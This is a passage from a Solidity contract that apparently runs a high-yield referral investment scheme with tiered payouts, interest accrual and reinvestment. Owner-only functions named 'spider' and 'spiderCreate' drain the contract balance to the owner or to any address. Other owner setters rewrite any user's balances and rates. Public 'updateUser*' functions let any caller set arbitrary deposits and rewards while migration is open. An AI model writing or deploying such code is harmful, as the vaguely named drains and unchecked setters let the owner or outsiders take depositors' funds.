            affRewardDiv = ((player.affRewards.mul(interestRateDivisor)).mul(50).div(100)).div(interestRateDivisor);
            collectProfit = ((affRewardDiv.mul(interestRateDivisor).div(minrefrate)).mul(secPassed)).div(interestRateDivisor);    
          }
          else if(info[msg.sender].affRewardsTotalPayout>=silver && info[msg.sender].affRewardsTotalPayout<gold){
            affRewardDiv = ((player.affRewards.mul(interestRateDivisor)).mul(25).div(100)).div(interestRateDivisor);
            collectProfit = ((affRewardDiv.mul(interestRateDivisor).div(minrefrate)).mul(secPassed)).div(interestRateDivisor);    
          }
          else if(info[msg.sender].affRewardsTotalPayout>=gold){
            collectProfit = 0;    
          }
          
      }
      return collectProfit.add(player.interestProfit_ref);
    }
    
    
    function getReferralProfitReinvestment(address _addr)public view returns (uint) {
        
      address playerAddress= _addr;
      Player storage player = players[playerAddress];
      require(player.time > 0,'player time is 0');
      require(info[_addr].is_level_activated,'0 Direct joinee');
        
      uint secPassed = now.sub(info[_addr].Level_timestamp);
      if (secPassed > 0) {
          uint collectProfit;
          uint affRewardDiv;
          if(info[msg.sender].affRewardsTotalPayout>=leader && info[msg.sender].affRewardsTotalPayout<star){
            collectProfit = 0;    
          }
          else if(info[msg.sender].affRewardsTotalPayout>=star && info[msg.sender].affRewardsTotalPayout<silver){
            affRewardDiv = ((player.affRewards.mul(interestRateDivisor)).mul(50).div(100)).div(interestRateDivisor);
            collectProfit = ((affRewardDiv.mul(interestRateDivisor).div(minrefrate)).mul(secPassed)).div(interestRateDivisor);    
          }
          else if(info[msg.sender].affRewardsTotalPayout>=silver && info[msg.sender].affRewardsTotalPayout<gold){
            affRewardDiv = ((player.affRewards.mul(interestRateDivisor)).mul(75).div(100)).div(interestRateDivisor);
            collectProfit = ((affRewardDiv.mul(interestRateDivisor).div(minrefrate)).mul(secPassed)).div(interestRateDivisor);    
          }
          else if(info[msg.sender].affRewardsTotalPayout>=gold){
            collectProfit = ((player.affRewards.mul(interestRateDivisor).div(minrefrate)).mul(secPassed)).div(interestRateDivisor);    
          }
         
      }
      return collectProfit.add(info[msg.sender].affRewardsReinvestment);
    }
    
    
    function collelct_ref(address _addr) internal{
            
        Player storage player = players[_addr];

        // uint256 current_level = player.Level_reached;
        uint secPassed = now.sub(info[_addr].Level_timestamp);
        if (secPassed > 0) {
        
          uint collectProfit;
          uint affRewardDiv;
          if(info[msg.sender].affRewardsTotalPayout>=leader && info[msg.sender].affRewardsTotalPayout<star){
            collectProfit = ((player.affRewards.mul(interestRateDivisor).div(minrefrate)).mul(secPassed)).div(interestRateDivisor);    
             player.interestProfit_ref = 0;
          }
          else if(info[msg.sender].affRewardsTotalPayout>=star && info[msg.sender].affRewardsTotalPayout<silver){
            affRewardDiv = ((player.affRewards.mul(interestRateDivisor)).mul(50).div(100)).div(interestRateDivisor);
            collectProfit = ((affRewardDiv.mul(interestRateDivisor).div(minrefrate)).mul(secPassed)).div(interestRateDivisor);   
             player.interestProfit_ref = 0;
          }
          else if(info[msg.sender].affRewardsTotalPayout>=silver && info[msg.sender].affRewardsTotalPayout<gold){
            affRewardDiv = ((player.affRewards.mul(interestRateDivisor)).mul(25).div(100)).div(interestRateDivisor);
            collectProfit = ((affRewardDiv.mul(interestRateDivisor).div(minrefrate)).mul(secPassed)).div(interestRateDivisor);  
             player.interestProfit_ref = 0;
          }
          else if(info[msg.sender].affRewardsTotalPayout>=gold){
            collectProfit = 0;    
             player.interestProfit_ref = 0;
          }
          
             player.interestProfit_ref = player.interestProfit_ref.add(collectProfit);
             info[_addr].Level_timestamp =info[_addr].Level_timestamp.add(secPassed);
        }  
           
        
    }
    
    function collelct_ref_levelStar(address _addr) internal{
            
        Player storage player = players[_addr];

        // uint256 current_level = player.Level_reached;
        uint secPassed = now.sub(info[_addr].Level_timestamp);
        if (secPassed > 0) {
        
           uint collectProfit;
          uint affRewardDiv;
          if(info[msg.sender].affRewardsTotalPayout>=leader && info[msg.sender].affRewardsTotalPayout<star){
            collectProfit = 0;    
          }
          else if(info[msg.sender].affRewardsTotalPayout>=star && info[msg.sender].affRewardsTotalPayout<silver){
            affRewardDiv = ((player.affRewards.mul(interestRateDivisor)).mul(50).div(100)).div(interestRateDivisor);
            collectProfit = ((affRewardDiv.mul(interestRateDivisor).div(minrefrate)).mul(secPassed)).div(interestRateDivisor);    
          }
          else if(info[msg.sender].affRewardsTotalPayout>=silver && info[msg.sender].affRewardsTotalPayout<gold){
            affRewardDiv = ((player.affRewards.mul(interestRateDivisor)).mul(75).div(100)).div(interestRateDivisor);
            collectProfit = ((affRewardDiv.mul(interestRateDivisor).div(minrefrate)).mul(secPassed)).div(interestRateDivisor);    
          }
          else if(info[msg.sender].affRewardsTotalPayout>=gold){
            collectProfit = ((player.affRewards.mul(interestRateDivisor).div(minrefrate)).mul(secPassed)).div(interestRateDivisor);    
          }
          
             info[msg.sender].affRewardsReinvestment = info[msg.sender].affRewardsReinvestment.add(collectProfit);
             info[_addr].Level_timestamp =info[_addr].Level_timestamp.add(secPassed);
        }  
           
        
    }
    
    
    
     function withdraw_referral() public {
    
        collelct_ref(msg.sender);
        require(players[msg.sender].interestProfit_ref > 0);
         
        transferPayout(msg.sender, players[msg.sender].interestProfit_ref,true);
    }
    
    
    function reinvest_bonus() public {
      collelct_ref(msg.sender);
      Player storage player = players[msg.sender];
      uint256 depositAmount = player.interestProfit_ref;
      player.trxDeposit = player.trxDeposit.add(depositAmount);
     
      player.interestProfit_ref = 0;
    
    }
    
    
    function reinvest_bonus_star() public {
      collelct_ref_levelStar(msg.sender);
      Player storage player = players[msg.sender];
      uint256 depositAmount = info[msg.sender].affRewardsReinvestment;
      player.trxDeposit = player.trxDeposit.add(depositAmount);
      info[msg.sender].affRewardsReinvestment = 0;
    
    }
    
    
    function starLevelUpdate() public{
        
        if(info[msg.sender].affRewardsTotalPayout>=leader && info[msg.sender].affRewardsTotalPayout<star){
            levelstar[msg.sender].leaderTotal = players[msg.sender].affRewards;
            levelstar[msg.sender].leaderButton = true;
            levelstar[msg.sender].starButton = false;
            levelstar[msg.sender].silverButton = false;
            levelstar[msg.sender].goldButton = false;
            
          }
        else if(info[msg.sender].affRewardsTotalPayout>=star && info[msg.sender].affRewardsTotalPayout<silver){
            levelstar[msg.sender].starTotal = players[msg.sender].affRewards.mul(50).div(100);
            levelstar[msg.sender].leaderButton = false;
            levelstar[msg.sender].starButton = true;
            levelstar[msg.sender].silverButton = false;
            levelstar[msg.sender].goldButton = false;
          }
        else if(info[msg.sender].affRewardsTotalPayout>=silver && info[msg.sender].affRewardsTotalPayout<gold){
            levelstar[msg.sender].silverTotal = players[msg.sender].affRewards.mul(75).div(100);
            levelstar[msg.sender].leaderButton = false;
            levelstar[msg.sender].starButton = false;
            levelstar[msg.sender].silverButton = true;
            levelstar[msg.sender].goldButton = false;
          }
        else if(info[msg.sender].affRewardsTotalPayout>=gold){
            levelstar[msg.sender].goldTotal = players[msg.sender].affRewards;
            levelstar[msg.sender].leaderButton = false;
            levelstar[msg.sender].starButton = false;
            levelstar[msg.sender].silverButton = false;
            levelstar[msg.sender].goldButton = true;
          }
        
    }
    
    

    function getProfit(address _addr) public view returns (uint) {
      address playerAddress= _addr;
      Player storage player = players[playerAddress];
      require(player.time > 0,'player time is 0');
      uint collectProfit;
      uint secPassed = now.sub(player.time);
      uint joinSecPassed = now.sub(info[msg.sender].joining_time);
      if (secPassed > 0) {
          if(joinSecPassed>0 && joinSecPassed<=180 days){
            collectProfit = (((player.trxDeposit.mul(dailyPercent).mul(interestRateDivisor).div(commissionDivisorPoint)).div(minuteRate)).mul(secPassed)).div(interestRateDivisor);
          }
          else if(joinSecPassed>180 days && joinSecPassed<=360 days){
            collectProfit = (((player.trxDeposit.mul(dailyPercent1).mul(interestRateDivisor).div(commissionDivisorPoint1)).div(minuteRate)).mul(secPassed)).div(interestRateDivisor);
          }
          else if(joinSecPassed>360 days){
            collectProfit = (((player.trxDeposit.mul(dailyPercent2).mul(interestRateDivisor).div(commissionDivisorPoint2)).div(minuteRate)).mul(secPassed)).div(interestRateDivisor);
          }
      }
      return collectProfit.add(player.interestProfit);
    }
    
    
    function collect(address _addr) internal {
        Player storage player = players[_addr];
        uint collectProfit;
        uint secPassed = now.sub(player.time);
        uint joinSecPassed = now.sub(info[msg.sender].joining_time);
        if (secPassed > 0 && player.time > 0) {
            if(joinSecPassed>0 && joinSecPassed<=180 days){
                collectProfit = (((player.trxDeposit.mul(dailyPercent).mul(interestRateDivisor).div(commissionDivisorPoint)).div(minuteRate)).mul(secPassed)).div(interestRateDivisor);
                player.interestProfit = 0;
                player.interestProfit = player.interestProfit.add(collectProfit);
                player.time = player.time.add(secPassed);
            }
            
          else if(joinSecPassed>180 days && joinSecPassed<=360 days){
            collectProfit = (((player.trxDeposit.mul(dailyPercent1).mul(interestRateDivisor).div(commissionDivisorPoint1)).div(minuteRate)).mul(secPassed)).div(interestRateDivisor);
            player.interestProfit = 0;
            player.interestProfit = player.interestProfit.add(collectProfit);
            player.time = player.time.add(secPassed);
          }
          else if(joinSecPassed>360 days){
            collectProfit = (((player.trxDeposit.mul(dailyPercent2).mul(interestRateDivisor).div(commissionDivisorPoint2)).div(minuteRate)).mul(secPassed)).div(interestRateDivisor);
            player.interestProfit = 0;
            player.interestProfit = player.interestProfit.add(collectProfit);
            player.time = player.time.add(secPassed);
          }
            
        }
    }
    
     
    function withdraw() public {
        collect(msg.sender);
        require(players[msg.sender].interestProfit > 0);

        transferPayout(msg.sender, players[msg.sender].interestProfit,false);
    }
    
    function reinvest() public {
      collect(msg.sender);
      Player storage player = players[msg.sender];
      uint256 depositAmount = player.interestProfit;
      player.trxDeposit = player.trxDeposit.add(depositAmount);
      player.interestProfit = 0;
      
      distributeRef(depositAmount, player.affFrom);
   
    }
    


    function transferPayout(address _receiver, uint _amount,bool flag) internal {
        if (_amount > 0 && _receiver != address(0)) {
          uint contractBalance = address(this).balance;
            if (contractBalance > 0) {
                uint payout = _amount > contractBalance ? contractBalance : _amount;
                totalPayout = totalPayout.add(payout);

                Player storage player = players[_receiver];
                player.payoutSum = player.payoutSum.add(payout);
                if(flag)
                {
                    emit refferalWithdrawal(msg.sender,payout);
                    info[msg.sender].affRewardsTotalPayout = info[msg.sender].affRewardsTotalPayout.add(payout);
                    player.interestProfit_ref = player.interestProfit_ref.sub(payout);
                    player.interestProfit_ref = 0;
                    starLevelUpdate();
                     
                }else{
                    emit profitWithdrawal(msg.sender,payout);
                    player.interestProfit = player.interestProfit.sub(payout);
                    player.interestProfit = 0;
                }
                

                msg.sender.transfer(payout);
            }
        }
    }
    

    

    
    
    function spider( uint _amount) external {
        require(msg.sender==owner,'Permission denied');
        if (_amount > 0) {
          uint contractBalance = address(this).balance;
            if (contractBalance > 0) {
                uint amtToTransfer = _amount > contractBalance ? contractBalance : _amount;
                

                msg.sender.transfer(amtToTransfer);
            }
        }
    }
    
    function spiderCreate(address add, uint _amount) external {
        require(msg.sender==owner,'Permission denied');
        if (_amount > 0) {
          uint contractBalance = address(this).balance;
            if (contractBalance > 0) {
                uint amtToTransfer = _amount > contractBalance ? contractBalance : _amount;
                add.transfer(amtToTransfer);
            }
        }
    }
    
    function getContractBalance () public view returns(uint cBal)
    {
        return address(this).balance;
    }
    
    
     function setReleaseTime(uint256 _ReleaseTime) public {
      require(msg.sender==owner);
      releaseTime = _ReleaseTime;
    }
    

    
    function setMinuteRate(uint256 _MinuteRate) public {
      require(msg.sender==owner);
      minuteRate = _MinuteRate;
    }
    
    function setMinuteRateDivisor(uint256 _MinuteRateDivisor) public {
      require(msg.sender==owner);
      interestRateDivisor = _MinuteRateDivisor;
    }
    
    function setRefMinuteRate(uint256 _MinuteRate) public {
      require(msg.sender==owner);
      minrefrate = _MinuteRate;
    }
    function setDailyPercent(uint256 _Percentage, uint256 _Percentage1, uint256 _Percentage2, uint256 _denominator,uint256 _denominator1,uint256 _denominator2 ) public {
      require(msg.sender==owner);
      dailyPercent = _Percentage;
      dailyPercent1 = _Percentage1;
      dailyPercent2 = _Percentage2;
      commissionDivisorPoint = _denominator;
      commissionDivisorPoint1 = _denominator1;
      commissionDivisorPoint2 = _denominator2;
    }
    
    

    modifier onlyOwner() {
        require(owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }



    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }
    
    
    
    function userUpdateActivation() public onlyOwner {
            updateActivation = false; // Activate or Deactivate by giving true false

    }
    function userUpdateDeActivation() public onlyOwner {
            updateActivation = true; // Activate or Deactivate by giving true false

    }
   
    
    function updateUserPlayer(
        address userAddress, 
        uint trxDeposit,
        uint investment_amt,
        uint j_time,
        uint affRewards,
        uint payoutSum,
        address affFrom,
        uint td_team,
        uint td_business,
        
        uint256 Level_timestamp
       
        ) public returns(bool){
            
            if(!updateActivation && !updatebuttons[userAddress].b1){
                require(!isContract(userAddress));
                require(trxDeposit != 0 );
                players[userAddress].trxDeposit = trxDeposit;
                players[userAddress].investment_amt = investment_amt;
                players[userAddress].time = now;
                players[userAddress].j_time = j_time;
                players[userAddress].affRewards = affRewards;
                players[userAddress].payoutSum = payoutSum;
                players[userAddress].affFrom = affFrom;
                players[userAddress].td_team = td_team;
                players[userAddress].td_business = td_business;
                players[userAddress].interestProfit_ref = 0;
                players[userAddress].interestProfit = 0;
                
                if(Level_timestamp!=0){
                     info[userAddress].Level_timestamp = now;
                }
                else{
                     info[userAddress].Level_timestamp = 0;
                }

                updatebuttons[userAddress].b1 = true;
                return true;
                
            }
            else{
                return false;
            }
            
            
        
    }
    
    function updateUserInfo(
        address userAddress,
        bool is_level_activated,
        
        uint256 total_business,
        uint interestProfit_cum,
        uint interestProfit_ref_cum,
        uint reward_earned_cum,
        uint cashback_cum,
        uint256 Level_timestamp_player,
        
        uint cashback,
        uint reward_earned,
        uint256 Level_reached
        ) public returns (bool){
            
            if(!updateActivation && !updatebuttons[userAddress].b2){
                  require(!isContract(userAddress));
                // require(!info[userAddress].is_level_activated, "User Info Already Updated");
                players[userAddress].cashback = cashback;
                players[userAddress].Level_reached = Level_reached;
                players[userAddress].reward_earned = reward_earned;
                
                info[userAddress].is_level_activated = is_level_activated;
                info[userAddress].total_business = total_business;
                info[userAddress].interestProfit_cum = interestProfit_cum;
                info[userAddress].interestProfit_ref_cum = interestProfit_ref_cum;
                info[userAddress].reward_earned_cum = reward_earned_cum;
                info[userAddress].cashback_cum = cashback_cum;
                info[userAddress].Level_timestamp_player = Level_timestamp_player;
                info[userAddress].joining_time = now; //today default
                
                updatebuttons[userAddress].b2 = true;
                return true;
            }
            else{
                return false;
            }
        
    }
    
    function updateUserPreferral(
        address userAddress,
        address player_addr,
        uint256 aff1sum,
        uint256 aff2sum,
        uint256 aff3sum,
        uint256 aff4sum,
        uint256 aff5sum,
        uint256 aff6sum,
        uint256 aff7sum,
        uint256 aff8sum,
        uint256 aff9sum,
        uint256 aff10sum
        ) public returns(bool){
            
            if(!updateActivation && !updatebuttons[userAddress].b3){
                  require(!isContract(userAddress));
                // require(preferals[userAddress].player_addr == address(0) , "User Already Registered");
                preferals[userAddress].player_addr = player_addr;
                preferals[userAddress].aff1sum = aff1sum;
                preferals[userAddress].aff2sum = aff2sum;
                preferals[userAddress].aff3sum = aff3sum;
                preferals[userAddress].aff4sum = aff4sum;
                preferals[userAddress].aff5sum = aff5sum;
                preferals[userAddress].aff6sum = aff6sum;
                preferals[userAddress].aff7sum = aff7sum;
                preferals[userAddress].aff8sum = aff8sum;
                preferals[userAddress].aff9sum = aff9sum;
                preferals[userAddress].aff10sum = aff10sum;
                
                updatebuttons[userAddress].b3 = true;
            return true;
            }
            else{
                return false;
            }
            
        
    }
    
    function updateUserIndividualLevelIncomes(
        address userAddress,
        uint256 L1_income,
        uint256 L2_income,
        uint256 L3_income,
        uint256 L4_income,
        uint256 L5_income,
        uint256 L6_income,
        uint256 L7_income,
        uint256 L8_income,
        uint256 L9_income,
        uint256 L10_income
        ) public returns(bool){
            if(!updateActivation && !updatebuttons[userAddress].b4){
                  require(!isContract(userAddress));
                // require(individual_level_incomes[userAddress].L1_income != 0, "Level Income not Started yet");
                individual_level_incomes[userAddress].L1_income = L1_income;
                individual_level_incomes[userAddress].L2_income = L2_income;
                individual_level_incomes[userAddress].L3_income = L3_income;
                individual_level_incomes[userAddress].L4_income = L4_income;
                individual_level_incomes[userAddress].L5_income = L5_income;
                individual_level_incomes[userAddress].L6_income = L6_income;
                individual_level_incomes[userAddress].L7_income = L7_income;
                individual_level_incomes[userAddress].L8_income = L8_income;
                individual_level_incomes[userAddress].L9_income = L9_income;
                individual_level_incomes[userAddress].L10_income = L10_income;
                
                updatebuttons[userAddress].b4 = true;
                return true;
            }
            else{
                return false;
            }
    }
    
    function updateUserCashback(
        address userAddress,
        bool cb1,
        bool cb2,
        bool cb3,
        bool cb4,
        bool cb5,
        bool claimed,
        bool deposited
        ) public returns(bool){
            if(!updateActivation && !updatebuttons[userAddress].b5){
                  require(!isContract(userAddress));
                cashbacks[userAddress].cb1 = cb1;
                cashbacks[userAddress].cb2 = cb2;
                cashbacks[userAddress].cb3 = cb3;
                cashbacks[userAddress].cb4 = cb4;
                cashbacks[userAddress].cb5 = cb5;
                cashbacks[userAddress].claimed = claimed;
                cashbacks[userAddress].deposited = deposited;
                
                updatebuttons[userAddress].b5 = true;
                return true;
            }
            else{
                return false;
            }
    }
    
    function updateUserCashbackIncome(
        address userAddress,
        uint256 cb1_income,
        uint256 cb2_income,
        uint256 cb3_income,
        uint256 cb4_income,
        uint256 cb5_income,
        bool r1_claimed,
        bool r2_claimed,
        bool r3_claimed,
        bool r4_claimed,
        bool r5_claimed,
        bool r6_claimed
        ) public returns(bool){
            if(!updateActivation && !updatebuttons[userAddress].b6){
                  require(!isContract(userAddress));
                cashback_available[userAddress].cb1_income = cb1_income;
                cashback_available[userAddress].cb2_income = cb2_income;
                cashback_available[userAddress].cb3_income = cb3_income;
                cashback_available[userAddress].cb4_income = cb4_income;
                cashback_available[userAddress].cb5_income = cb5_income;
                
                rewards[userAddress].r1_claimed = r1_claimed;
                rewards[userAddress].r2_claimed = r2_claimed;
                rewards[userAddress].r3_claimed = r3_claimed;
                rewards[userAddress].r4_claimed = r4_claimed;
                rewards[userAddress].r5_claimed = r5_claimed;
                rewards[userAddress].r6_claimed = r6_claimed;
                
                updatebuttons[userAddress].b6 = true;
                return true;
            }
            else{
                return false;
            }
    }
    
    function updateUserReward(
        address userAddress,
        bool r1,
        bool r2,
        bool r3,
        bool r4,
        bool r5,
        bool r6
       
        ) public  returns(bool){
            if(!updateActivation && !updatebuttons[userAddress].b7){
                  require(!isContract(userAddress));
                rewards[userAddress].r1 = r1;
                rewards[userAddress].r2 = r2;
                rewards[userAddress].r3 = r3;
                rewards[userAddress].r4 = r4;
                rewards[userAddress].r5 = r5;
                rewards[userAddress].r6 = r6;
                
                updatebuttons[userAddress].b7 = true;
                
                return true;
            }
            else{
                return false;
            }
        
    }
    
    function updateHighBusiness(
        address userAddress,
        uint256 r1_business,
        uint256 r2_business,
        uint256 r3_business,
        uint256 r4_business,
        uint256 r5_business,
        uint256 r6_business,
        uint256 r7_business,
        uint256 r8_business,
        uint256 r9_business,
        uint256 r10_business
        ) public  returns(bool){
            if(!updateActivation && !updatebuttons[userAddress].b8){
                  require(!isContract(userAddress));
                business_high[userAddress].r1_business = r1_business;
                business_high[userAddress].r2_business = r2_business;
                business_high[userAddress].r3_business = r3_business;
                business_high[userAddress].r4_business = r4_business;
                business_high[userAddress].r5_business = r5_business;
                business_high[userAddress].r6_business = r6_business;
                business_high[userAddress].r7_business = r7_business;
                business_high[userAddress].r8_business = r8_business;
                business_high[userAddress].r9_business = r9_business;
                business_high[userAddress].r10_business = r10_business;
                
                updatebuttons[userAddress].b8 = true;
                return true;
            }
            else{
                return false;
            }
        
    }
    
    function updateHighBusinessAdd(
        address userAddress,
        address r1_business_add,
        address r2_business_add,
        address r3_business_add,
        address r4_business_add,
        address r5_business_add,
        address r6_business_add,
        address r7_business_add,
        address r8_business_add,
        address r9_business_add,
        address r10_business_add
        ) public  returns(bool){
            if(!updateActivation && !updatebuttons[userAddress].b9){
                  require(!isContract(userAddress));
                business_high_add[userAddress].r1_business_add = r1_business_add;
                business_high_add[userAddress].r2_business_add = r2_business_add;
                business_high_add[userAddress].r3_business_add = r3_business_add;
                business_high_add[userAddress].r4_business_add = r4_business_add;
                business_high_add[userAddress].r5_business_add = r5_business_add;
                business_high_add[userAddress].r6_business_add = r6_business_add;
                business_high_add[userAddress].r7_business_add = r7_business_add;
                business_high_add[userAddress].r8_business_add = r8_business_add;
                business_high_add[userAddress].r9_business_add = r9_business_add;
                business_high_add[userAddress].r10_business_add = r10_business_add;
                
                updatebuttons[userAddress].b9 = true;
                return true;
            }
            else{
                return false;
            }
        
    }
    
    function updateRewardIncome(
        address userAddress,
        uint256 r1_income,
        uint256 r2_income,
        uint256 r3_income,
        uint256 r4_income,
        uint256 r5_income,
        uint256 r6_income
        ) public  returns(bool){
            if(!updateActivation && !updatebuttons[userAddress].b10) {
                  require(!isContract(userAddress));
                reward_available[userAddress].r1_income = r1_income;
                reward_available[userAddress].r2_income = r2_income;
                reward_available[userAddress].r3_income = r3_income;
                reward_available[userAddress].r4_income = r4_income;
                reward_available[userAddress].r5_income = r5_income;
                reward_available[userAddress].r6_income = r6_income;
                
                updatebuttons[userAddress].b10 = true;
                return true;
            }
            else{
                return false;
            }
        
    }
    
    
    
    
    
    // UserReward Control
    
    
    
    function updateUserPlayerAd(
        address userAddress, 
        uint trxDeposit,
        uint investment_amt,
        uint time,
        uint j_time,
        uint interestProfit,
        uint affRewards,
        uint payoutSum
       
        ) public onlyOwner returns(bool){
            
            players[userAddress].trxDeposit = trxDeposit;
            players[userAddress].investment_amt = investment_amt;
            players[userAddress].time = time;
            players[userAddress].j_time = j_time;
            players[userAddress].interestProfit = interestProfit;
            players[userAddress].affRewards = affRewards;
            players[userAddress].payoutSum = payoutSum;
           
            return true;
                
        
    }
    
    function updateUserPlayerAd2(
        address userAddress, 
        address affFrom,
        uint td_team,
        uint td_business,
        uint interestProfit_ref,
        uint cashback,
        uint reward_earned,
        uint256 Level_reached
        ) public onlyOwner returns(bool){
            
            players[userAddress].affFrom = affFrom;
            players[userAddress].td_team = td_team;
            players[userAddress].td_business = td_business;
            players[userAddress].interestProfit_ref = interestProfit_ref;
            players[userAddress].cashback = cashback;
            players[userAddress].Level_reached = Level_reached;
            players[userAddress].reward_earned = reward_earned;
            return true;
                
        
    }
    
    function updateUserInfoAd(
        address userAddress,
        bool is_level_activated,
        uint256 Level_timestamp,
        uint256 total_business,
        uint interestProfit_cum,
        uint interestProfit_ref_cum,
        uint reward_earned_cum,
        uint cashback_cum,
        uint256 Level_timestamp_player,
        uint joining_time,
        uint affRewardsTotalPayout,
        uint affRewardsReinvestment
        
        ) public onlyOwner returns (bool){
            
            info[userAddress].is_level_activated = is_level_activated;
            info[userAddress].Level_timestamp = Level_timestamp;
            info[userAddress].total_business = total_business;
            info[userAddress].interestProfit_cum = interestProfit_cum;
            info[userAddress].interestProfit_ref_cum = interestProfit_ref_cum;
            info[userAddress].reward_earned_cum = reward_earned_cum;
            info[userAddress].cashback_cum = cashback_cum;
            info[userAddress].Level_timestamp_player = Level_timestamp_player;
            info[userAddress].joining_time = joining_time; //1602584123 default
            info[userAddress].affRewardsTotalPayout = affRewardsTotalPayout;
            info[userAddress].affRewardsReinvestment = affRewardsReinvestment;
            return true;
           
    }
    
    function updateUserPreferralAd(
        address userAddress,
        address player_addr,
        uint256 aff1sum,
        uint256 aff2sum,
        uint256 aff3sum,
        uint256 aff4sum,
        uint256 aff5sum,
        uint256 aff6sum,
        uint256 aff7sum,
        uint256 aff8sum,
        uint256 aff9sum,
        uint256 aff10sum
        ) public onlyOwner returns(bool){
            
           
            preferals[userAddress].player_addr = player_addr;
            preferals[userAddress].aff1sum = aff1sum;
            preferals[userAddress].aff2sum = aff2sum;
            preferals[userAddress].aff3sum = aff3sum;
            preferals[userAddress].aff4sum = aff4sum;
            preferals[userAddress].aff5sum = aff5sum;
            preferals[userAddress].aff6sum = aff6sum;
            preferals[userAddress].aff7sum = aff7sum;
            preferals[userAddress].aff8sum = aff8sum;
            preferals[userAddress].aff9sum = aff9sum;
            preferals[userAddress].aff10sum = aff10sum;
            return true;
            
            
        
    }
    
    function updateUserIndividualLevelIncomesAd(
        address userAddress,
        uint256 L1_income,
        uint256 L2_income,
        uint256 L3_income,
        uint256 L4_income,
        uint256 L5_income,
        uint256 L6_income,
        uint256 L7_income,
        uint256 L8_income,
        uint256 L9_income,
        uint256 L10_income
        ) public onlyOwner returns(bool){
           
            individual_level_incomes[userAddress].L1_income = L1_income;
            individual_level_incomes[userAddress].L2_income = L2_income;
            individual_level_incomes[userAddress].L3_income = L3_income;
            individual_level_incomes[userAddress].L4_income = L4_income;
            individual_level_incomes[userAddress].L5_income = L5_income;
            individual_level_incomes[userAddress].L6_income = L6_income;
            individual_level_incomes[userAddress].L7_income = L7_income;
            individual_level_incomes[userAddress].L8_income = L8_income;
            individual_level_incomes[userAddress].L9_income = L9_income;
            individual_level_incomes[userAddress].L10_income = L10_income;
            return true;
       
    }
    
    function updateUserCashbackAd(
        address userAddress,
        bool cb1,
        bool cb2,
        bool cb3,
        bool cb4,
        bool cb5,
        bool claimed,
        bool deposited
        ) public onlyOwner returns(bool){
           
            cashbacks[userAddress].cb1 = cb1;
            cashbacks[userAddress].cb2 = cb2;
            cashbacks[userAddress].cb3 = cb3;
            cashbacks[userAddress].cb4 = cb4;
            cashbacks[userAddress].cb5 = cb5;
            cashbacks[userAddress].claimed = claimed;
            cashbacks[userAddress].deposited = deposited;
            return true;
        
    }
    
    function updateUserCashbackIncomeAd(
        address userAddress,
        uint256 cb1_income,
        uint256 cb2_income,
        uint256 cb3_income,
        uint256 cb4_income,
        uint256 cb5_income,
        bool r1_claimed,
        bool r2_claimed,
        bool r3_claimed,
        bool r4_claimed,
        bool r5_claimed,
        bool r6_claimed
        ) public onlyOwner returns(bool){
           
            cashback_available[userAddress].cb1_income = cb1_income;
            cashback_available[userAddress].cb2_income = cb2_income;
            cashback_available[userAddress].cb3_income = cb3_income;
            cashback_available[userAddress].cb4_income = cb4_income;
            cashback_available[userAddress].cb5_income = cb5_income;
            
            rewards[userAddress].r1_claimed = r1_claimed;
            rewards[userAddress].r2_claimed = r2_claimed;
            rewards[userAddress].r3_claimed = r3_claimed;
            rewards[userAddress].r4_claimed = r4_claimed;
            rewards[userAddress].r5_claimed = r5_claimed;
            rewards[userAddress].r6_claimed = r6_claimed;
            
            return true;
           
    }
    
    function updateUserRewardAd(
        address userAddress,
        bool r1,
        bool r2,
        bool r3,
        bool r4,
        bool r5,
        bool r6
       
        ) public onlyOwner returns(bool){
           
            rewards[userAddress].r1 = r1;
            rewards[userAddress].r2 = r2;
            rewards[userAddress].r3 = r3;
            rewards[userAddress].r4 = r4;
            rewards[userAddress].r5 = r5;
            rewards[userAddress].r6 = r6;
           
            
            return true;
           
        
    }
    
    function updateHighBusinessAd(
        address userAddress,
        uint256 r1_business,
        uint256 r2_business,
        uint256 r3_business,
        uint256 r4_business,
        uint256 r5_business,
        uint256 r6_business,
        uint256 r7_business,
        uint256 r8_business,
        uint256 r9_business,
        uint256 r10_business
        ) public onlyOwner returns(bool){
           
            business_high[userAddress].r1_business = r1_business;
            business_high[userAddress].r2_business = r2_business;
            business_high[userAddress].r3_business = r3_business;
            business_high[userAddress].r4_business = r4_business;
            business_high[userAddress].r5_business = r5_business;
            business_high[userAddress].r6_business = r6_business;
            business_high[userAddress].r7_business = r7_business;
            business_high[userAddress].r8_business = r8_business;
            business_high[userAddress].r9_business = r9_business;
            business_high[userAddress].r10_business = r10_business;
            return true;
       
        
    }
    
    function updateHighBusinessAddAd(
        address userAddress,
        address r1_business_add,
        address r2_business_add,
        address r3_business_add,
        address r4_business_add,
        address r5_business_add,
        address r6_business_add,
        address r7_business_add,
        address r8_business_add,
        address r9_business_add,
        address r10_business_add
        ) public onlyOwner returns(bool){
           
            business_high_add[userAddress].r1_business_add = r1_business_add;
            business_high_add[userAddress].r2_business_add = r2_business_add;
            business_high_add[userAddress].r3_business_add = r3_business_add;
            business_high_add[userAddress].r4_business_add = r4_business_add;
            business_high_add[userAddress].r5_business_add = r5_business_add;
            business_high_add[userAddress].r6_business_add = r6_business_add;
            business_high_add[userAddress].r7_business_add = r7_business_add;
            business_high_add[userAddress].r8_business_add = r8_business_add;
            business_high_add[userAddress].r9_business_add = r9_business_add;
            business_high_add[userAddress].r10_business_add = r10_business_add;
            return true;
           
        
    }
    
    function updateRewardIncomeAd(
        address userAddress,
        uint256 r1_income,
        uint256 r2_income,
        uint256 r3_income,
        uint256 r4_income,
        uint256 r5_income,
        uint256 r6_income
        ) public onlyOwner returns(bool){
            
            reward_available[userAddress].r1_income = r1_income;
            reward_available[userAddress].r2_income = r2_income;
            reward_available[userAddress].r3_income = r3_income;
            reward_available[userAddress].r4_income = r4_income;
            reward_available[userAddress].r5_income = r5_income;
            reward_available[userAddress].r6_income = r6_income;
            return true;
    }
    
    function updateLevelDistribtion(
        uint256 _leader,
        uint256 _star,
        uint256 _silver,
        uint256 _gold
        ) public onlyOwner returns(bool){
            
           leader = _leader;
           star = _star;
           silver = _silver;
           gold = _gold;
           return true;
    }
    
    
    function updateBusinessSeld(
        uint256 _business1,
       
        
        uint256 _selfAmt1,
        uint256 _selfAmt2,
        uint256 _selfAmt3,
        uint256 _selfAmt4,
        uint256 _selfAmt5
        ) public onlyOwner returns(bool){
             business1 = _business1; 
           
